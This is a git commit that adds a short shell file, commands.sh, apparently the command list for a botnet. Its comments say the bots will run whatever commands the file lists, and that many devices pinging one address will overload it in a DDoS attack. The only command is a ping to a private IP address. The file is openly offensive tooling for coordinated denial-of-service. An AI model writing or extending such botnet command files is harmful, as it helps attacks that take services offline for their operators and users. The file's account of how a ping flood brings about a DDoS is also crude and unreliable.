b1a372d3935047bbf67a246011439558e07d67be
ghostface <wseven347.devopser@gmail.com>
2025-01-26 03:40:37 -0700

    Create commands.sh

---
+++ src/commands.sh
@@ -0,0 +1,10 @@
+# example: ping <IP-address>
+
+
+# The ping command checks to see if a computer is online by sending a packet to it and waiting for a response
+# If several devices do this, the site at the specified IP address will be overloaded, which will lead to a DDoS attack
+
+# Plus you can add your own commands, this does not change the essence
+# The botnet will do whatever you specify in this file
+
+ping 192.168.1.101
